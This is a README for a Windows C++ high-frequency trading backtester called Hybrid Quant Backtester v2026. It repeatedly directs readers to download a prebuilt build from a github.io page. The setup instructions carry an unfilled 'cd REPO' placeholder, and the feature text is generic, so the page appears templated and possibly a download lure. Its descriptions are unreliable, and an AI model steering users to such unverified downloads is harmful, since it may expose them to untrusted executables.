# Hybrid Quant Backtester v2026 - high-frequency backtesting engine 2026

> **Hybrid Quant Backtester is a Windows-focused C++ backtesting engine for high-frequency trading workflows, pairing low-latency L2 market replay, LibTorch/PyTorch inference, and the current 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/sam-baker40/hybrid-quant-backtest-windows?style=flat-square)](https://github.com/sam-baker40/hybrid-quant-backtest-windows)

---

<p align="center">
  <a href="https://sam-baker40.github.io/hybrid-quant-backtest-windows/">
    <img src="https://img.shields.io/badge/Download-Hybrid%20Quant%20Backtester%20Latest-brightgreen?style=for-the-badge" alt="Download Hybrid Quant Backtester">
  </a>
</p>

> **[Direct Download - Hybrid Quant Backtester v2026](https://sam-baker40.github.io/hybrid-quant-backtest-windows/)**

---

[Download Latest Build](https://sam-baker40.github.io/hybrid-quant-backtest-windows/)

---

## Overview

Hybrid Quant Backtester is intended for developers and researchers building high-frequency strategies that rely on detailed order book replay and rapid experiment cycles. Its core strength is level 2 market data simulation with a lean execution path, which helps when validating logic tied to timing, queue position, and other microstructure-driven effects.

The codebase is written in C++ and combines market simulation with TorchScript or JIT inference via LibTorch/PyTorch. Along with memory-mapped I/O, cache-line aligned data structures, thread affinity, and a pre-allocated memory pool, it targets workloads where backtest throughput and execution consistency are both important.

---

## Capabilities

- Very low-latency execution loop for quick backtest iterations
- Zero-copy ingestion for level 2 market data
- TorchScript or JIT inference support through LibTorch/PyTorch
- Queue position decay modeling for order book dynamics
- Pre-allocated memory pool to cut allocation overhead
- Asynchronous lock-free logging for off-thread output processing
- CPU core pinning and thread affinity controls
- Microstructure-oriented market simulation with realistic order book behavior

---

## Installation

Clone the repository and build it with your preferred Windows C++ toolchain:

```bash
git clone https://github.com/sam-baker40/hybrid-quant-backtest-windows.git
cd REPO
```

Once the project is compiled, start the executable from the build output folder or open the generated project files if you are working from an IDE.

---

## How to Use It

A normal backtest flow looks like this:

1. Load or map level 2 market data into the engine.
2. Set the execution model and inference path if you are using a TorchScript or JIT model.
3. Run the simulation against the dataset you selected.
4. Inspect fills, queue changes, and logger output for performance review.

Example workflow:

```bash
HybridQuantBacktester.exe --data market_l2.bin --model strategy.pt --symbol ES
```

If your build uses a different startup entrypoint, supply the dataset and model paths through the matching command-line switches or project settings.

---

## Configuration

Depending on how you embed the engine, configuration is usually provided through runtime flags, input files, or build-time settings.

```ini
[data]
source=market_l2.bin
format=level2
memory_mapped_io=true

[engine]
thread_affinity=true
cpu_pin=auto
preallocated_pool=true

[model]
backend=libtorch
mode=jit
```

If your setup is configured in source, refer to the project files or launch arguments to confirm the exact keys supported by your build.

---

## Requirements

- Windows platform
- C++ toolchain
- LibTorch / PyTorch runtime for model inference paths
- Sufficient RAM for level 2 data and in-memory simulation
- Storage for market data, models, and generated logs
- Multi-core CPU recommended for thread affinity and pinned execution

---

## FAQ

**How do I stay current with releases?**  
Use the download link above to get the latest published build, or watch the repository for release updates.

**Where can I adjust runtime behavior?**  
Check command-line options, engine configuration files, or project settings related to the data source, inference backend, and CPU affinity controls.

**What should I verify if performance is below expectations?**  
Look at the data source format, make sure memory-mapped I/O is enabled where it applies, and confirm thread affinity plus core pinning settings on the target machine.

**Can I plug in my own model?**  
Yes. The setup supports TorchScript or JIT inference through LibTorch/PyTorch, so model integration depends on how your build is assembled.

**What if the executable does not launch?**  
Check the Windows environment, required runtime dependencies, and the location of the build output before starting the program.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
